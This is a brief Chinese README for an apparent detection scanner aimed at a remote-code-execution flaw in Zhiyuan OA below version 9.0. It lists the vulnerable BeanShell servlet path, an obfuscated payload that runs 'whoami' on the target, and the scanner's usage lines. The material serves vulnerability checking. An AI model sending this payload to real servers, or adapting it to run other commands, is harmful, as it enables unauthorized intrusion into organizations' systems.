## 致远OA_RCE检测
存在漏洞的版本
* <9.0

漏洞路径
```txt
/weaver/bsh.servlet.BshServlet
```

利用payload
```txt
bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.outp ut=raw'
```

使用说明
```
python scan.py 1 [url]
python scan.py 2 [file]
```

**结果**
![](https://s2.ax1x.com/2019/09/21/nzfKnH.png)

图片看不了请手动观看：https://s2.ax1x.com/2019/09/21/nzfKnH.png






